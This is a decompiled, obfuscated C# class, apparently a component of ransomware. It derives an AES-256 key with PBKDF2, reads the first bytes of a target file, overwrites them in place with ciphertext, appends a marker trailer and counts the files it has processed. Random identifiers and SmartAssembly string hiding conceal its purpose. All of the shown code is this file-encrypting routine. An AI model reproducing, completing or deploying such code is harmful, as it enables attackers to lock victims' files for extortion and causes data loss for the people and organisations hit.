using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace esImVhYKuzS;

public static class nkFelzsRBEm
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] qpZLeuvzdxLp(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = QtpNHpGNRm(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes QtpNHpGNRm(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] KQWFCtUZBKxS(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (jIDJtYejSBzFCRw.tVdkKlIvaDpXN == getString_0(107396866))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (jIDJtYejSBzFCRw.yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(jIDJtYejSBzFCRw.mldgFSRddxG, getString_0(107386328) + string_0 + getString_0(107400910) + ex.Message + getString_0(107396795));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool AHsEILkRsKltd(string nkUKfOqpmmlHAa, byte[] uxCXotfEsZFZTBQK, byte[] arqeKzgafBs = null)
	{
		try
		{
			byte[] array = null;
			if (jIDJtYejSBzFCRw.tVdkKlIvaDpXN == getString_0(107396866))
			{
				array = (jIDJtYejSBzFCRw.kGnGVVSmVYCjkQ ? Encoding.ASCII.GetBytes(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(jIDJtYejSBzFCRw.jkeBzDssrUOR) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400884)) + Convert.ToString(jIDJtYejSBzFCRw.gFTAyVipGERPhv) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400884))) : Encoding.ASCII.GetBytes(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(jIDJtYejSBzFCRw.jkeBzDssrUOR) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400893)) + Convert.ToString(jIDJtYejSBzFCRw.gFTAyVipGERPhv) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400893))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(nkUKfOqpmmlHAa, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(uxCXotfEsZFZTBQK, 0, uxCXotfEsZFZTBQK.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(nkUKfOqpmmlHAa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!jIDJtYejSBzFCRw.kGnGVVSmVYCjkQ)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(arqeKzgafBs, 0, arqeKzgafBs.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (jIDJtYejSBzFCRw.kGnGVVSmVYCjkQ ? Encoding.ASCII.GetBytes(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(jIDJtYejSBzFCRw.jkeBzDssrUOR) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400884)) + Convert.ToString(jIDJtYejSBzFCRw.gFTAyVipGERPhv) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400884))) : Encoding.ASCII.GetBytes(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(jIDJtYejSBzFCRw.jkeBzDssrUOR) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400893)) + Convert.ToString(jIDJtYejSBzFCRw.gFTAyVipGERPhv) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400893))));
				FileStream fileStream2 = new FileStream(nkUKfOqpmmlHAa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(uxCXotfEsZFZTBQK, 0, uxCXotfEsZFZTBQK.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(nkUKfOqpmmlHAa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!jIDJtYejSBzFCRw.kGnGVVSmVYCjkQ)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(arqeKzgafBs, 0, arqeKzgafBs.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			jIDJtYejSBzFCRw.JhEGykDTAlk++;
		}
		catch (Exception ex)
		{
			if (jIDJtYejSBzFCRw.yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(jIDJtYejSBzFCRw.mldgFSRddxG, getString_0(107386328) + nkUKfOqpmmlHAa + getString_0(107400843) + ex.Message + getString_0(107396795));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (jIDJtYejSBzFCRw.kGnGVVSmVYCjkQ ? Encoding.ASCII.GetBytes(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(jIDJtYejSBzFCRw.jkeBzDssrUOR) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400884)) + Convert.ToString(jIDJtYejSBzFCRw.gFTAyVipGERPhv) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400884))) : Encoding.ASCII.GetBytes(jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(jIDJtYejSBzFCRw.jkeBzDssrUOR) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400893)) + Convert.ToString(jIDJtYejSBzFCRw.gFTAyVipGERPhv) + jIDJtYejSBzFCRw.NGKPoQcRFBDfbNt(getString_0(107400893))));
				FileStream fileStream4 = new FileStream(nkUKfOqpmmlHAa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(uxCXotfEsZFZTBQK, 0, uxCXotfEsZFZTBQK.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(nkUKfOqpmmlHAa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!jIDJtYejSBzFCRw.kGnGVVSmVYCjkQ)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(arqeKzgafBs, 0, arqeKzgafBs.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static nkFelzsRBEm()
	{
		Strings.CreateGetStringDelegate(typeof(nkFelzsRBEm));
	}
}
